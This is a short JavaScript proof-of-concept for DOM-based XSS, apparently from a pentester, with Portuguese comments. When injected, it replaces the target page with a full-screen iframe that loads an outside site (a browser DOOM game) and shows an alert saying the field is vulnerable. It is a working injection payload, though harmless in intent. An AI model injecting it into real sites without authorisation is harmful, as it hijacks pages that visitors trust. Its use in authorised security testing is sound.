
// Créditos do Script: Fredrik Almroth

console.log("Teste de XSS DOM Based by André Henrique!! Injetando payload! :D");

// Sobrescrever o corpo do documento
function inject() {
	console.log("Stager: Injetando o iFrame...");
	document.title = "XSS in Pentest by Andre Henrique";
	document.getElementsByTagName('body')[0].innerHTML = '<iframe src="https://doom.pwn.life/" allowfullscreen style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;">';
	alert("ISH AVISA:\n\nSe vc estah lendo este aviso, o campo/field testado estah vulneravel a XSS DOM Based!\nIsto significa que um atacante, podera executar codigos JavaScript arbitrariamente\nno dominio " + document.domain + "!\n\nEntao, vamos provar isto jogando o DOOM!!");
}

// Verificar se o DOM pode ser injetado imediatamente ou se deve ser chamado por meio de eventos
if (document.readyState === "complete" || document.readyState === "interactive") {
	console.log("Stager: DOM Ok");
	inject();
} else if (window.attachEvent) {
	console.log("Stager: Anexando ao Onload");
	window.attachEvent('onload', inject);
} else if (window.addEventListener) {
	console.log("Stager: Anexando ao Load");
	window.addEventListener('load', inject, false);	
} else {
	console.log("Stager: Fallback para o Contador do iFrame");
	fc = document.getElementsByTagName('iframe').length;
	setInterval(
		function() {
			if (document.getElementsByTagName('iframe').length != fc) {
				return;
			} else {
				inject();
			}
		},
		300
	);
}
